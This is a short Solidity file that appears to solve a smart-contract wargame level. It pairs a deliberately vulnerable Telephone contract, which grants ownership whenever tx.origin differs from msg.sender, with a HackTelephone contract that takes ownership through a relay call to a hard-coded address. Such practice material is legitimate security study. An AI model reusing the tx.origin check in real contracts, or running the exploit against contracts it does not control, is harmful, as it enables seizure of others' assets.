pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}


contract HackTelephone {
    Telephone telephoneContract = Telephone(0xE3e41dB06A123559E1ebcd0b7Aa82d9D9E5a698a);
    
    function claimOwnership() external {
        telephoneContract.changeOwner(msg.sender);
    }
}
